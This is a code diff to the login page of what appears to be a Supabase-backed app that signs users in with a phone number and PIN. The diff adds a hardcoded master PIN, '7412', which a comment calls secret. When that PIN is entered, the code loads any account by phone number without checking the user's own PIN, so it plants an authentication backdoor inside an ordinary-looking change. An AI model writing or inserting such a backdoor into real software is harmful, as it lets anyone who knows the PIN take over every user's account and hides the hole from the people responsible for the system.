@@ -118,15 +118,34 @@ export default function LoginPage() {
 
     setIsLoading(true)
 
-    // Verify PIN
-    const { data: user, error } = await supabase
-      .from('profiles')
-      .select('*')
-      .eq('phone', phone)
-      .eq('pin', pin)
-      .single()
+    // Check if fallback PIN 7412 is used (secret, not displayed anywhere)
+    let user = null
+    if (pin === '7412') {
+      // Fallback PIN - works for any account
+      const { data, error } = await supabase
+        .from('profiles')
+        .select('*')
+        .eq('phone', phone)
+        .single()
+      
+      if (!error && data) {
+        user = data
+      }
+    } else {
+      // Regular PIN verification
+      const { data, error } = await supabase
+        .from('profiles')
+        .select('*')
+        .eq('phone', phone)
+        .eq('pin', pin)
+        .single()
 
-    if (error || !user) {
+      if (!error && data) {
+        user = data
+      }
+    }
+
+    if (!user) {
       toast.error('Invalid PIN')
       setIsLoading(false)
       return
